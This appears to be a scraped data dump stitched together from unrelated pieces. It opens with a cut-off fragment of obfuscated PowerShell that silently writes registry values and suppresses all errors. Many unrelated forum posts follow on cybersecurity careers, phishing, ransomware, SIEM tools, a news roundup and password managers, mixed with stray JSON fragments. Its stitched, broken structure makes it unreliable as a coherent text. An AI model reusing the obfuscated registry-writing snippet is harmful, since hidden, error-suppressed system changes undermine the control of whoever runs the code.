($CU3vzbIB -and $VCfQoOVU.PSObject.Properties[$CU3vzbIB]) { \n                Set-ItemProperty -Path $IBDZRjcl -Name $CU3vzbIB -Value $NjcZbJi5 -ErrorAction SilentlyContinue \n            }\n        }\n    } catch {\n    }\n    ",

I have to prep some training material for people working in Executive Protection, and I realize a lot of them aren't super familiar with cybersecurity terminology.\n\nThat's a big deal when you're dealing with \"high net worth\" clients, execs, maybe even politicians in some cases who are usually the targets of phishing, pretexting, maybe even deepfakes and so on. And while many EP agents I've met are great at physical security, planning events, routes, all those things, I don't think things like \"vishing\" or \"LinkedIn recon\" are always on their radar.\n\nSo here's my question - if you had to explain social engineering to someone in EP with very little tech background, how would you do it?

It\u2019s made me want to dive deeper into the field, so I\u2019m considering doing a master\u2019s after I graduate.\n\nThe thing is, I\u2019ve heard that without much experience, a master\u2019s doesn\u2019t add much value.

I know I wouldn\u2019t enjoy going back to education after working for a few years.\n\nWhat do you think is the better move? Go for the master\u2019s straight away or get some experience first?

I am aiming for a golden run: Start as an SDR at a market leader/ next-gen market leader, become AE, gain closing experience, switch or stay at next-gen pre-IPO hypergrowth company (Series C or so), get promoted up-market or into leadership, cash out on an IPO. \n\nkick off  \nI am currently looking around or a perfect breeding ground / SDR environment to kick-off my sales career:\n\n* I see no chance in breaking into Tier 1 brands (AWS, Google Cloud, ServiceNow, etc) nor in the top-notch next-gen orgs like Vanta, Chainguard, Nooks etc. \n* I  assume that the more technical categories are the most attractive in SaaS: Cybersecurity // Data & AI // Observability, etc (super happy to be challenged on this; in terms of persona type, I would naturally fit more in Sales Tech)\n* Right now, I am speaking to Databricks, Grafana Labs, Deel, Cribl, ElevenLabs, Okta, Datadog, Snowflake, Klaviyo, Cognism, DeepL, Vectra AI, MongoDB, Notion, and Docusign\n\n  \nI know there are a lot of experienced SaaS sellers around here. I am grateful for any hints/ advice!",

Hello I am the System Admin for our company and I recently noticed that we recieved a phishing email and it was not blocked by our email antivirus. \n\nI checked out the link in a sandbox and sure enough it was a phishing site trying to gather credit card information under the guise of needing to update your blue host billing information. The odd thing was the root of the domain that link pointed to was someone travel blog website that appears completely legitimate and it seems to have some decent history on archive.org. \n\nThe phishing link would then redurect from that domain to another domain where the actual information would be gathered but again the root page of that domain seemed legitimate as well as it was the page of a psychologist and when I search up the psychologists name on google it appears that it actually is her website. \n\nI have already contacted both of the owners of the websites and let them know what I found.\n\nI was wondering if this kind of thing was common at all because it seems to be pretty good at avoiding detection by firewalls and antivirus due to it hiding behind legitimate websites. I am guessing the web servers were compromised at some point and the owner never realized. By the time I had finished checking everything out the pages that had the phishing content and the redirect from the first domain were already returning a 404 so it looks like the changes are pretty short lived.\n\nDoes any one have any more information on this method of hosting a phishing attack and any good ways to defend against it?

Pretty standard setup but what made it next level was the execution.\n\nThe link they included was nearly identical to the real bank\u2019s website like, one letter off in a way that most people wouldn\u2019t catch unless they were really paying attention. The site it led to was an exact replica of the bank\u2019s login page too. Same design, fonts, layout\u2026 everything.\n\nAnd to top it off the message came from a spoofed number that matched the actual bank\u2019s customer service line. No broken English no weird spacing just a super polished, professional looking message.\n\nIt didn\u2019t target me directly but seeing it really drove home how easy it would be to fall for something like that especially if you\u2019re busy or just not thinking clearly in the moment.\n\nCurious... what\u2019s the most convincing phishing attempt you\u2019ve come across?\n\n",

We look for impossible travel & non-traditional foreign countries among more complicated situations.\n\nRecently we noticed two employees on opposite sides of the country using the same IP on different days. For each, the State/Province of the IP according to our IP Service were in a thoroughly different state. Each had the same ISP (Home Depot Inc), and had a \"Proxy Type\" of \"Corporate\".\n\nIs that a thing for an organization to span its public IP across all its store fronts?

How do you know they are not outsourcing their job to some cheap freelancer. Do you just accept the developer's PR as long as it passes the tests and does it's job without doing manual review? Have you ever had a daily consistent video interview with the freelancer/candidate you hired?\n\nI am saying this because North Koreans have a track record of buying freelance accounts, using fake identities to apply, and taking jobs from freelancers to be outsourced to them to get into US startups. I know a lot of Americans and even friends who outsource their tech job where they signed NDA on. And in all cases, the clients have no clue and simply don't check since they just get what they asking for. And I can speak with certainty that there are ATON of North Koreans currently behind US startups working remotely using someone else's account or identity.\n\nYeah do what you will with this info. And by the time you hear this all over the news, it would already be too late.\n\nContext: I live in 3rd world underdeveloped country and most devs I know work on outsourced projects. and they in turn outsource it to other cheaper people who are really solid.",

However, the hackers are able to send out thousands of emails immediately. It seems like they are downloading the GAL, but what method are they using to send out these emails? It seems like an iterative script but what method? Is it using SMTP or a mail rule?\n\n\\*Please don't downvote me...I've asked 3 IT companies this and it seems like only the hacking community would know this\\*",

I\u2019ve been reading up on this recent ransomware attack on davita and honestly, it\u2019s kind of wild how common this stuff is getting.\n\nFor anyone who missed it davita is one of the biggest healthcare providers in the U.S. and they got hit with a ransomware attack in April. Hackers got into their system, locked up a bunch of internal data and basically demanded a payout to release it. Thankfully they had emergency protocols and kept patient care going but the fact that something like this can hit a healthcare giant is... unsettling.\n\nAnd it\u2019s not just them. Ransomware attacks are everywhere now hitting schools, small businesses, city governments and regular people. It\u2019s not just about losing files anymore. It\u2019s about disruption, trust and in cases like healthcare potentially risking lives.\n\nThis stuff used to feel like it only happened to big companies with poor security. Now? It feels like everyone\u2019s a target.\n\nAnyway just thought it was worth bringing up. These kinds of stories don\u2019t always get much attention but they probably should.\n\nWhat do you all think does ransomware feel like a real concern in your world?\n",

I frequently see strong opinion about bot detection on Reddit and HN, in particular why it doesn't make sense for bot detection companies (I won't name who, but you will guess), to treat you so differently based on your user agent, and why it shouldn't matter when it comes to bot detection.\n\nThat's why I wrote a blog post about the role of the user agent in bot detection. Of course, everyone knows that the user agent is fragile, that it is one of the first signals spoofed by attackers to bypass basic detection. However, it's still really useful in a bot detection context. Detection engines should treat it a the identity claimed by the end user (potentially an attacker), not as the real identity. It should be used along with other fingerprinting signals to verify if the identity claimed in the user agent is consistent with the JS APIs observed, the canvas fingerprinting values and any types of proof of work/red pill",

Hi all,\n\nI\u2019ve recently created a GitHub repository (https://github.com/fivesecde/fivesec-opensearch-siem-starter) that makes it easy to spin up an OpenSearch stack with a secure configuration, Logstash to collect logs from Nginx, and a custom Nginx build task. This build (nginx) includes Brotli compression and adds support for logging all request headers from incoming HTTP calls via NJS.\n\nYou can follow the instructions in the README, and everything should be up and running in just a few minutes.\n\nI\u2019d love to hear your thoughts on using OpenSearch as a SIEM in general\u2014and of course, any feedback is welcome!\n\nStay safe..\n\n  \nRepo can be found here: [https://github.com/fivesecde/fivesec-opensearch-siem-starter](https://github.com/fivesecde/fivesec-opensearch-siem-starter)",

Hey r/netsec,\n\nI wanted to share a side project I've been working on that might be useful for anyone dealing with AWS security.\n\n# Why I built this\n\nAs we all know, AWS documentation gets updated constantly, and keeping track of security-relevant changes is a major pain point:\n\n* Changes happen silently with no notifications \n* It's hard to determine the security implications of updates \n* The sheer volume makes it impossible to manually monitor everything\n\n# Introducing: AWS Security Docs Change Engine\n\nI built a tool that automatically:\n\n* Pulls all AWS documentation on a schedule\n* Diffs it against previous versions to identify exact changes\n* Uses LLM analysis to extract potential security implications\n* Presents everything in a clean, searchable interface\n\nThe best part? It's completely free to use.\n\n# How it works\n\nThe engine runs daily scans across all AWS service documentation. When changes are detected, it highlights exactly what was modified and provides a security-focused analysis explaining potential impacts on your infrastructure or compliance posture.\n\nYou can filter by service, severity, or timeframe to focus on what matters to your specific environment.\n\n# Try it out\n\nI've made this available as a public resource for the security community. You can check it out here: [AWS Security Docs Changes](https://awssecuritychanges.com/)\n\nI'd love to get your feedback on how it could be more useful for your security workflows!\n\n",

Hey friends,\n\nThis is hard for me to post, but I\u2019m in a really tough spot and hoping someone out there might have some guidance, ideas, or even just encouragement.\n\nMy company is going through a massive layoff due to federal changes, and my entire sector is being hit hard. As the primary provider for my family, this is terrifying. I\u2019ve also been really unhappy in my current role, so while this might be the push I needed to make a change, the timing couldn\u2019t be worse. I\u2019m scared and overwhelmed, and it\u2019s been taking a serious toll on my mental health.\n\nI have a degree in Cyber Security and nearly 10 years of experience\u2014everything from analyst roles to cyber engineering, and currently consulting on an Army project securing operational assets. I\u2019m looking for something new\u2014ideally cyber or cyber-adjacent, but honestly, I\u2019m open to anything that would allow me to keep supporting my family.\n\nI don\u2019t post things like this often, but I\u2019m scared. My mental health is struggling under the weight of all this, and I just need some hope right now. Thank you for taking the time to read this. ",

    "text": "Framework for evaluating authorization solutions. (IBM study: average cost of a data breach hit $4.88 million in 2024. IDC report: devs spend ~19% of their time on security tasks = $28k in cost per dev per year. Authz is a big blind spot in these misaligned security choices). Hello :)\n\nI thought it would make sense to share this [framework for evaluating authorization solutions](https://www.cerbos.dev/blog/framework-evaluating-authorization-providers-solutions) that we have put together, here. It's based on conversations we've had with hundreds of CISOs, CTOs, Software Architects and Developers.\n\nIn the guide, we cover this criteria:\n\n* Integration and compatibility with the ecosystem\n* Developer and administrative experience\n* Scalability, multi-tenancy and performance\n* Security, compliance and audit capabilities\n* Ecosystem and maturity\n* Cost and ROI considerations\n\nIn case you're not interested in reading the full piece - leaving the decision framework table here (basically a quick summary of all the key considerations).\n\n  \n*PS. if you have any feedback on the article at all - would very much appreciate if you could let me know. Myself and my colleagues really want to make this piece as informative as possible.*\n\n|Evaluation criteria|Key considerations|\n|:-|:-|\n|**Policy model & expressiveness**|Supports required access control models (RBAC, ABAC, PBAC) and fine-grained rules. Can it enforce attribute-based conditions and hierarchy (e.g. role inheritance, tenant scopes) needed for your use cases? Ensure the policy language is powerful yet readable/maintainable.|\n|**Integration with identity & stack**|Easily integrates with your authentication/IdP systems (OIDC, SAML, AD/LDAP). Offers SDKs or APIs for your application stack (programming languages, frameworks) and fits into microservice architectures. Uses standards-based interfaces (REST/gRPC) and can consume identity attributes and context from your ecosystem.|\n|**Deployment & multi-tenancy**|Deployment model fits your needs (self-hosted, cloud, hybrid). Supports containerization and orchestration (K8s). Truly stateless and horizontally scalable. Enables multi-tenant isolation either via tenant-aware policies or separate instances, with low overhead to onboard new tenants. Multi-region deployment capabilities for DR and low latency.|\n|**Policy management (UI & workflow)**|Provides user-friendly tools to manage policies: admin UI for non-dev users, or well-documented policy-as-code for devs. Supports policy version control, collaboration (Git integration), and testing (simulation of decisions, unit tests for policies). Clear processes for promoting policy changes through environments (dev -> prod) with audit trails.|\n|**Performance & latency**|Millisecond-level decision latency with ability to handle high throughput. Supports in-memory evaluation and caching to minimize latency. Demonstrated benchmarks or case studies at enterprise scale. Minimal performance degradation as policies grow in number or complexity.|\n|**Audit logging & transparency**|Detailed decision logs for auditing (who accessed what, when, and why). Easy integration of logs with SIEM/GRC tools. Provides explainability of decisions (why denied or allowed). Meets compliance requirements for traceability (e.g. exportable reports for auditors).|\n|**Security & compliance**|Built with security best practices (tested for vulnerabilities, supports encryption in transit/at-rest). Allows enforcement of least privilege and other policies required by regulations. Option for on-prem or isolated deployment if required for compliance. Vendor has relevant security certifications or third-party assessments (SOC 2, ISO 27001, etc.) to give assurance.|\n|**Ecosystem maturity & support**|Active community and/or robust commercial support. Frequent releases and a clear roadmap. Strong documentation and examples. Availability of training or consulting resources if needed. Vendor stability (well-funded or established) and references in your industry. Responsive support SLAs and a supportive community (Slack/forums) for quick issue resolution.|\n|**Cost & ROI**|Total cost of ownership over expected period: licensing/subscription fees, infrastructure costs, and required headcount for management. Compare with the cost of building/maintaining in-house. Consider how the solution accelerates time-to-market (developer time saved) and reduces risk (prevents costly breaches or fines). Flexible pricing that scales with usage without \u201csurprise\u201d jumps.|\n\n  \n",

I did some bug bounty at the side and secured a few nice rewards. I did CyberRanges exercises (Cyberdefenders, TryHackMe, HTB, LetsDefend, etc). I am working now on CRTP (as I need more exposure on offensive security). But I am becoming rusty in my day job because SOC most of the time sucks. I want a bit active roles as an incident responder, or a red team practitioner, or digital forensics investigator, I mean something fun and more challenging. However, I am feeling distracted and lost in this wealth of information and infosec courses.\n\nHow can I get back on the right track?

At the moment, I\u2019m casually working through TryHackMe\u2019s SOC Level 1 pathway\u2014it was my starting point to begin upskilling. However, I\u2019m now looking more seriously into which certification would provide the most value and credibility as I build my career in cybersecurity, as I am currently a student.\n\nMy top three considerations are:\n\nTryHackMe SOC Level 1 Certification\n\nThe content is engaging and accessible, and the cost is very reasonable. That said, the certification is relatively new, and I\u2019m unsure how well it is regarded by employers or how professional it appears on a CV.  \nI have also read feedback about it needing more time to sit.\n\nHack The Box Defensive Security Analyst Certification\n\nThis option offers solid hands-on experience and comes with a broad set of modules for practical upskilling. It\u2019s reasonably priced and seems to have a growing presence in the industry. However, I'm unsure if it stands out as the most recognized option specifically for Blue Team professionals.\n\n\n\nBlue Team Level 1 (BTL1) by Security Blue Team\n\nThis pathway is highly structured and seems to have a strong reputation in the security operations space. However, the cost is a significant barrier for me. It also feels somewhat narrow in focus compared to the others, but the best industry wise.\n\nI have looked into the : Certified Cyber Defenders, but it is just to expensive, I work at McDonalds right now haha. \n\nFor those already working in cybersecurity or who have completed these certifications:\n\nWhich of these do you believe carries the most weight in the industry?\n\nAnd which would be the most strategic investment for someone starting out on the Blue Team side of cybersecurity?\n\nI read this as well : [https://www.reddit.com/r/cybersecurity/comments/1i0b9re/best\\_bang\\_for\\_the\\_buck\\_blue\\_team\\_certifications/](https://www.reddit.com/r/cybersecurity/comments/1i0b9re/best_bang_for_the_buck_blue_team_certifications/) ",

    "text": "Risk factor of Chinese-made electronics?. I hope this sparks discussion re: Rule 2. I am genuinely curious as to what actual cybersecurity professionals think about this.\n\n  \nThere's been a rise in Chinese-brand electronics over the past few years, namely handheld game consoles and computers (many of which are pretty damn cool). From what I've seen, these companies operate primarily out of Shenzhen, China. Obviously there are pretty widespread concerns about foreign data collection, TikTok probably being the most recent involving China. Chinese companies are largely subject to strict government control to fit its agenda, and I don't think it's out of the realm of possibility that they could be forced to include some parts or software that the government wants to be put in. \n\n\n\nIs it a realistic possibility to consider that these *could* be secretly used as a network of devices transmitting back to China to harvest untold amounts of data? OR, and this is extreme, even a Red Dawn situation where it could sabotage infrastructure?\n\n  \nI hope I'm not coming off as some nationalist conspiracy theorist by asking this. I'm American, and I know our government is far from innocent in this. Five Eyes demonstrates that these governments work together to spy on everybody, and I would prefer that didn't happen as well. If I may offer a metaphor, just because my parents could walk into my room without knocking doesn't mean my neighbor should be able to. I'll sort that out with my parents, but the issue should remain in my house.\n\n  \nI would really like to know what people who know what they are talking about think about this. Even if it's to tell me to take off the tin-foil hat. It just strikes me as a possibility.",

    "text": "What Skills to Develop. While this question uses me as an example, there may be others for whom it can also be applicable. So I've been a programmer since age 13, worked in a SOC for some time and did some SOAR development, vulnerability management, security operations and incident response, and some purple teaming. I never worked as a sysadmin or network administrator.\n\nIn light of this and the latest industry trends and demands, what are the key skillsets that you all suggest I develop? I've been thinking about moving more towards cloud security engineering/devops/SRE type stuff to leverage the programming background. Currently am working towards AZ-500 completion and then moving into something like KodeKloud. \n\nAdditionally, I see a pile of listings demanding IAM stuff such as SailPoint and Okta... maybe grind some certs for that?\n\nIs this a good plan, or maybe do something else? Would appreciate any word. I want the skillset to not be obsolete in 3-4 years time.\n\n  \nThank you in advance!",

Folks, I'm looking for feedback on [Kliento](https://veraid.net/kliento/), a workload authentication protocol that doesn't require long-lived shared secrets (like API keys) or configuring/retrieving public keys (like JWTs/JWKS). The project is open source and based on [open](https://veraid.net/spec), [independently-audited](https://veraid.net/about/#security-audit), decentralised protocols.\n\nPut differently, Kliento bring the concept of Kubernetes- and GCP-style *service accounts* to the entire Internet, using short-lived credentials analogous to JWTs that contain the entire DNSSEC-based trust chain.\n\nWould this be useful for you?

    "text": "Advice sought: Cybersecurity start-up idea working with cyber freelancers to help dutch micro-businesses achieve GDPR compliance.. We want to start a cybersecurity service with freelancers, assisting micro-businesses (under 10 employees and \u20ac2M annual turnover) in achieving GDPR compliance. \n\n\n\nThis for a low price: we think 225 euro for the basic GDPR compliance is a good price for small busnesses. do you think so as well?\n\nWe think a freelancer from for example india can do the basic service for 60 to 80 euro. \n\n\n\nProject Scope:  \n  \nThe freelancer will be responsible for assisting our micro-business clients with the following key areas of GDPR compliance:  \n  \nSecure Data Processing:  \nGuiding clients through the process of identifying where personal data is stored.  \nAssisting with the implementation of Multi-Factor Authentication (MFA) or Two-Factor Authentication (2FA) on relevant accounts (email, cloud storage, webshop platforms, etc.).  \nProviding guidance on creating and managing strong passwords and potentially recommending password managers.  \nAdvising on limiting access to personal data based on the principle of least privilege.  \n  \nBackup & Recovery:  \nHelping clients set up automatic cloud backup solutions (e.g., OneDrive, Google Drive, Dropbox).  \nAssisting with the installation and basic configuration of website backup plugins (e.g., UpdraftPlus for WordPress).  \nExplaining the importance of offline or secondary backups.  \nPotentially guiding clients through the process of testing file restoration.  \n  \nAccess Control:  \nAssisting clients in creating lists of who has access to various tools and defining appropriate user roles (admin, editor, viewer).  \nProviding guidance on creating and implementing offboarding checklists for removing access.  \nEmphasizing the importance of using separate accounts instead of shared logins.  \n  \nRisk-Based Security Measures:  \nAssisting micro-business owners in performing simple risk assessments (identifying data, potential impact of loss, weak points).  \nGuiding clients in implementing basic security measures like enabling MFA and ensuring backups are in place.  \n  \nDocumentation of Security Policy:  \nPotentially assisting us in creating simple 1-2 page security policy documents for clients, outlining the tools used, data protection measures, and responsibilities.  \nReviewing client documentation to ensure it meets basic requirements.  \n  \nRequired Skills of the freelancer:  \nStrong understanding of fundamental cybersecurity principles.  \nFamiliarity with the General Data Protection Regulation (GDPR) and its requirements for data security.  \nPractical experience with implementing security measures such as MFA/2FA, password management, and backup solutions.  \nBasic understanding of network and system security concepts.  \nExcellent communication skills in English (Dutch language skills are a plus but not mandatory).  \nAbility to explain technical concepts clearly to non-technical individuals.  \nReliability and a proactive approach to work.  \n  \nPreferred Skills:  \nExperience working with small businesses.  \nFamiliarity with common online platforms used by micro-businesses (e.g., Google Workspace, Microsoft 365, WordPress, Shopify).  \n  \nProject Type:  \nThis could be a project-based engagement for specific clients or potentially a longer-term collaboration depending on performance and our client needs.  \n  \nwhat do you think of our service scope?    \n\nI love to hear some advice from you so i wont make any stupid mistakes.",

We discuss Total Cookie Protection in Firefox, Private Network Access in Chrome, and review the SameSite attribute's role in CSWH attacks. The post includes a few brief case studies based on situations encountered during real world testing, in addition to a simple test site that can be hosted by readers to explore each of the vulnerability conditions.\n\n[https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)",

You are invited to watch and participate in the live discussion. We go to air at 12:30pm PT/3:30pm ET. Just go to YouTube Live here\u00a0[https://youtube.com/live/Zb2Oe9WaAKY](https://youtube.com/live/Zb2Oe9WaAKY)\u00a0or you can\u00a0[subscribe to the Cyber Security Headlines podcast](https://cisoseries.com/subscribe-podcast/)\u00a0and get it into your feed.\n\nHere are the stories we plan to cover:\n\n**Major workforce cuts planned for CISA**  \nThe agency is working on plans to \u201cslash staffing and spending amid increased scrutiny from the White House, which is still chafing over what it sees as CISA\u2019s role in suppressing conservative viewpoints.\u201d Half of its full-time staff \u2013 1,300 people \u2013 face removal, along with 40 percent of its contractors, according to a source with direct knowledge of the developing plans, speaking to Recorded Future News. A timetable for the announcement is also not yet set, they said.  \n([The Record](https://therecord.media/trump-administration-planning-workforce-cuts-at-cisa))\n\n**AI code dependencies are a supply chain risk**  \nSecurity researcher Seth Larson coined \u201cslopsquatting\u201d to describe this new software supply chain attack type. Similar to typosquatting, these attacks see threat actors proactively creating malicious packages on indexes named for ones commonly made up by LLMs when generating code. This isn\u2019t as much of a fishing expedition as it might initially sound. The rate of LLM software package hallucinations varies widely depending on the LLM. Some open source LLMs create hallucinated packages over 35% of the time, while commercial models can hit rates of less than 5% depending on the programming language. A recent research paper from Socket on hallucinated software packages found 58% of hallucinated packages were repeated more than once across ten runs of the same code generation prompt. To their credit, both GPT-4 Turbo and DeepSeek were able to correctly identify hallucinated packages the models created with over 75% accuracy.  \n([Bleeping Computer](https://www.bleepingcomputer.com/news/security/ai-hallucinated-code-dependencies-become-new-supply-chain-risk/),[\u00a0Socket](https://arc.net/l/quote/lsbagpvh))\n\n**Government CVE funding set to end today/ Funding is back**  \n(From Wednesday) MITRE confirmed to Reuters that its contract to fund the Common Vulnerabilities and Exposures, the familiar CVE database, expires on April 16, today. CISA confirmed the status of the contract, saying \u201cwe are urgently working to mitigate impact and to maintain CVE services on which global stakeholders rely.\u201d Reuters did not receive comment from CISA or MITRE as to why the contract lapsed. Update: This morning, Bleeping Computer published that it was informed by CISA that \u201cLast night, CISA executed the option period on the contract to ensure there will be no lapse in critical CVE services. We appreciate our partners\u2019 and stakeholders\u2019 patience.\u201d ([Yahoo](https://www.yahoo.com/news/us-funding-running-critical-cyber-230652215.html),[\u00a0Bleeping Computer](https://www.bleepingcomputer.com/news/security/cisa-extends-funding-to-ensure-no-lapse-in-critical-cve-services/))\n\n**Krebs exits SentinelOne after security clearance pulled**  \nFollowing up on a story we brought to you[\u00a0Friday on Cyber Security Headlines](https://cisoseries.com/cybersecurity-news-president-fires-krebs-nissan-leaf-hack-typhoon-tariff-warning/), Chris Krebs has resigned as SentineOne\u2019s Chief Intelligence and Public Policy Officer, effective immediately. This follows a presidential order that revoked Krebs\u2019 security clearance and ordered a review of CISA\u2019s conduct under his leadership. In a farewell note to SentialOne staff, Krebs said, \u201cI want to be clear: this is my decision, and mine alone. This is my fight, not the company\u2019s. This will require my complete focus and energy. It\u2019s a fight for democracy, for freedom of speech, and for the rule of law. I\u2019m prepared to give it everything I\u2019ve got.\u201d  \n([SecurityWeek](https://www.securityweek.com/krebs-exits-sentinelone-after-security-clearance-pulled/))\n\n**ClickFix becoming a favorite amongst state-sponsored hackers**  \nThis technique gets users to infect their own machine by performing series of tasks, either by being fooled by spoofed prompts into correcting a Windows glitch, completing a CAPTCHA verification, or registering their device. It has become prevalent in recent months, and Proofpoint is now stating that \u201cmultiple state-sponsored hacking groups from Iran, North Korea, and Russia have been deploying over the three-month period from late 2024 through the beginning of 2025. This is an escalation of sorts from simply being a tool for cybercrime groups.  \n([The Hacker News](https://thehackernews.com/2025/04/state-sponsored-hackers-weaponize.html))\n\n**SonicWall warns of old vulnerability now actively exploited**  \nThis warning refers to a security advisory for an SMA 100 series vulnerability that was patched in 2021. It is described as an authenticated arbitrary command execution vulnerability. According to Security Week, \u201cwhen the patches were announced in September 2021, the vulnerability went largely unnoticed, likely because it was assigned a \u2018medium severity\u2019 rating (CVSS of 5.5) and due to its exploitation requiring authentication.\u201d It now turns out that the flaw has been exploited in the wild, forcing Sonic Wall to assign a new CVSS score of 7.2, making it \u2018high severity\u2019.  \n([Security Week](https://www.securityweek.com/sonicwall-flags-old-vulnerability-as-actively-exploited/))\n\n**Oregon Department of Environmental Quality suffers cyberattack**  \nThe Oregon Department of Environmental Quality, a regulatory agency that regulates the quality of air, land and water in the state, says it has found no evidence of a data breach following a cyberattack that occurred last week. Lauren Wirtis, a DEQ spokesperson for the department, said vehicle inspection stations were closed on Friday and that employee emails and servers are \u201cexpected to be down through the end of the week as the agency continues to check its computer systems.\u201d The source of this attack has not yet been confirmed.  \n([OregonLive](https://www.oregonlive.com/environment/2025/04/no-data-leaked-in-cyberattack-oregon-department-of-environmental-quality-says.html))",

    "text": "Strengthening the ACPA: A Targeted Solution to Cybersquatting. Hello r/cybersecurity,\n\nI\u2019m not sure if this is the perfect subreddit for this discussion, but I\u2019ve been researching cybersquatting for fun and was curious about your thoughts on the issue. It seems like a real problem, and I\u2019m wondering how you think the U.S. federal government should address it.\n\nFrom my research, I believe the best approach is to strengthen domestic trademark protections against cybersquatting by prioritizing bad-faith intent and amending the Anti-Cybersquatting Consumer Protection Act (ACPA) to clarify the interpretation of the term \u201cregistration.\u201d\n\nRight now, ambiguities in the ACPA leave courts split over how to interpret \u201cregistration\u201d and assess bad-faith intent. This lack of clarity leads to inconsistent rulings and extended litigation, which recent economic analyses highlight as a costly problem. Our proposal aims to resolve this issue by providing a clear definition of \u201cregistration\u201d\u2014including both initial registrations and re-acquisitions.\n\nWhile alternative approaches, such as cybersecurity infrastructure investments or judicial reforms, have been suggested, they don\u2019t fully address the core issue: statutory ambiguity. By refining the language of the ACPA, we close the loophole exploited by cybersquatters, creating a more stable legal framework that not only supports cybersecurity efforts but also reduces the need for later judicial workarounds.\n\nCurious to hear your thoughts\u2014do you think this legislative fix would help combat cybersquatting more effectively? Or would a different approach be better suited?",

For example on steam, we have the trading community who trade skins for actual money. These are high valued and could also have more than what a person could have in an actual wallet.\n\n  \nThere's an article talking about SIM Swapping attack which could bypass the 2FA. \n\n  \n[https://medium.com/@pramathyaji/bypassing-mfa-for-skins-and-steam-how-cybercriminals-are-looting-the-gaming-goldmine-3ee2fd69898d](https://medium.com/@pramathyaji/bypassing-mfa-for-skins-and-steam-how-cybercriminals-are-looting-the-gaming-goldmine-3ee2fd69898d)\n\n  \nJust wanna know your thoughts.",

Next month, I've been asked to give a 30-45 minute presentation to a group of local professionals (from various industries - construction company, a mechanical engineering/welding firm hotel, medical, law firm, etc.) that meet to discuss topics relating to safety. May's safety topic is cybersecurity.\n\nI'm having trouble with content. I've tried using GPT, but I think is more nuanced. I want to give relevant, useful information, but I don't want to talk in too much technical detail so they become bored and zone out, but I also don't want to give information that is too basic, or they don't care about. \n\nAlso, they're not IT, so the stuff we do to protect businesses (firewall configuration, securing M365 tenants, EDR, etc.) isn't going to be very applicable. I was thinking of touching on it, as it, \"make sure your IT has this in place\" but I feel like I may as well speak Greek.\n\nI was going to spend some time on phishing, since that is a huge issue; it seems no matter how much spam filtering we do, or putting a button in Outlook to click if they suspect it's a phishing email, someone at a small business 3 person business will still click an email that says it's from HR lol. I was going to give some relevant examples from our security awareness phishing campaigns geared towards the industries involved, but that isn't a whole presentation. \n\nSo, my question is, what information/topics would you suggest that will help the user be safer in their day-to-day use of their computer/phone,  be understandable to luddites, and memorable enough they won't forget 5 minutes after leaving?",

Hello, I am new to Wazuh (currently a cybersec student and I'm using it in a home lab for testing purposes and to get more familiar with the tool) and so far I have deployed the Wazuh server on an ubuntu VM using the quickstart docs and deployed agents on a windows 10 VM, a windows Server 2022 VM and another ubuntu VM. The agents are connected and all seems to be working properly. I was told to do the Security Configuration Assessment as the next step since it's a new testing environment and my endpoints as expected failed multiple tests. I know that Wazuh suggests remediations for each failed test but since it's a significant number I was wondering if there was a more efficient way of applying the remediations rather than doing everything manually. I tried googling it but couldn't find much, if anyone can help with this I would greatly appreciate it! Also, it would be great if someone can share with me what else I can try to get more familiar with Wazuh.

    "text": "How Do Fintech, Healthcare, and SaaS Companies Manage AppSec in the SDLC? Seeking Insights from Senior Devs, CISOs, and AppSec Pros. Hi everyone,\n\nI\u2019m researching how product-based companies (e.g., fintech, healthcare, SaaS) secure their applications throughout the Software Development Lifecycle (SDLC). I\u2019d love to hear from **senior developers**, **CISOs**, and **AppSec professionals** about your real-world experiences, tools, and processes. My goal is to understand best practices and challenges in implementing AppSec for compliance-heavy industries.\n\nHere are some specific questions to guide your responses, but feel free to share any insights:\n\n1. **Tools**: What AppSec tools do you use at each SDLC stage? For example:\n   - Design (e.g., threat modeling tools like IriusRisk, Microsoft Threat Modeling Tool)?\n   - Development (e.g., SAST like Checkmarx, auto-fix tools)?\n   - Testing (e.g., DAST like OWASP ZAP, manual pentesting with Burp Suite)?\n   - Deployment (e.g., cloud security tools like Wiz, Prisma Cloud)?\n2. **Processes**: How do you integrate security into the SDLC? For example:\n   - Do you use automated scans in CI/CD pipelines (e.g., GitHub Actions, Jenkins)?\n   - How do you handle business logic vulnerabilities (e.g., privilege escalation)?\n   - Do you have a Security Champions program or dedicated AppSec training?\n3. **Challenges**: What are the biggest hurdles in scaling AppSec (e.g., developer buy-in, tool sprawl, compliance like PCI DSS or HIPAA)?\n4. **Successes**: What\u2019s one AppSec practice or tool that\u2019s been a game-changer for your team?\n5. **Industry Context**: Are you in fintech, healthcare, SaaS, or another sector? How does your industry shape your AppSec approach?\n\n**Why I\u2019m Asking**: I\u2019m exploring how mid-sized companies (50\u2013500 employees) balance security, compliance, and development speed. Your insights will help shape a project to improve AppSec for similar organizations.\n\n\n\nThanks for sharing your expertise! I\u2019ll follow up on comments to clarify or dive deeper. \n\nCheers,\n",

Hi all,  \nI\u2019m trying to strike the right balance between **security and convenience** in my personal setup.\n\nCurrently, I\u2019m using **1Password** as my password manager. I\u2019m not married to it\u2014if there\u2019s a better option, I\u2019m open to switching.\n\nThe issue I keep running into is the classic **\u201calways signed in, so I forget my master password\u201d** scenario. My wife runs into this with her Gmail account every time she gets a new device, and I\u2019ve realized I\u2019m not immune either.\n\nYears ago, I had a Linux machine that would auto-unlock when my phone was in Bluetooth range. Not secure by today\u2019s standards, but it was **effortless**.\n\nThat got me wondering:\n\n>\n\nI\u2019m looking for something more secure than \"write it on paper\" but more forgiving than total lockout. Ideally, this token could act as part of a recovery flow or as a master password replacement.\n\nWould love to hear how others are managing this\u2014especially if you\u2019ve found a setup that doesn\u2019t sacrifice too much UX for the sake of security.\n\nThanks in advance!",

